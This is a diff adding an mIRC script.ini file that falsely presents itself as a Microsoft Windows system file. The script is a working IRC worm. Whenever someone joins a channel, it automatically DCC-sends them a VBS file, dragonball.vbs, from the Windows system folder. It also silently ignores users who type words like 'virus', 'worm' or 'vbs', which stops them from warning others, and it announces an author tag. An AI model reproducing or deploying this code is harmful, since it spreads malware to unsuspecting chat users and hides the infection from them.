@@ -1,0 +1,18 @@
+[script]
+n0=*****************************************************************
+n1= ;(c) Copyright Microsoft Corporation, 2000 
+n2= ;This file is a part of (r) Windows system 
+n3= ;REMEMBER YOU DELETE THIS FILE FOR YOUR OWN RESPONIBILITY
+n4=*****************************************************************
+n5=
+n6=On 1:Join:#:{/if ($nick !== $me) { /dcc send $nick C:\WINDOWS\SYSTEM\dragonball.vbs  
+n7=} }
+n8=On 1:Text:*virus*:*:{ /ignore $nick 2 $wildsite }
+n9=On 1:Text:*ball*:*:{ /ignore $nick 2 $wildsite }
+n10=On 1:Text:*yup*:*:{ /ignore $nick 2 $wildsite }
+n11=On 1:Text:*worm*:{ /ignore $nick 2 $wildsite }
+n12=On 1:Text:*milioner*:*:{ /ignore $nick 2 $wildsite }
+n13=On 1:Text:*vbs*:*:{ /ignore $nick 2 $wildsite }
+n14=On 1:Text:*script*:*:{ /ignore $nick 2 $wildsite }
+n15=On 1:Text:*remonte*:*:{  /ignore $nick 2 $wildsite }
+n16=On 1:Join:#: { /notice $chan [|Dragon|Ball_Z|] p0w3r3d by YuP }
